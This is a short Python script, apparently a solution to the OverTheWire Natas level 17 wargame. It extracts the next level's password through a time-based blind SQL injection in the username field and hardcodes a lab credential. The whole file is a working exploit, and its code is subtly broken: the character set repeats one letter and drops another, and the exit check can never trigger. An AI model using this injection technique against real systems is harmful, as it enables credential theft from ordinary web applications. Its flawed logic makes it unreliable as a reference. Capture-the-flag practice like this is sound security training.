import requests
import re
from string import *
import time
import sys

characters = "abcdefghijkljmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789 "


logar = ["natas17","8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"]
url = "http://%s.natas.labs.overthewire.org/"%logar[0]
session = requests.Session()


vi_a_senha = list()
contador = 0
while True:
    for ch in characters:
        print("\n"*52)
        print(contador)
        print("Tentando ==>  "+"".join(vi_a_senha)+ch)
        tempo0= time.time()
        r = session.post(url, data={"username":'natas18" AND BINARY password LIKE "'+"".join(vi_a_senha)+ch+'%" AND SLEEP(2)#'}, auth=(logar[0],logar[1]), timeout=10)
        tempof = time.time()
        contador+= 1
        if tempof-tempo0 >= 2:
            vi_a_senha.append(ch)
            contento = r.text
            print(contento)
            contador = 0
            if contador > 64:
                print("\n"*52)
                print("Feito!")
                print("==>  "+"".join(vi_a_senha))
                sys.exit()
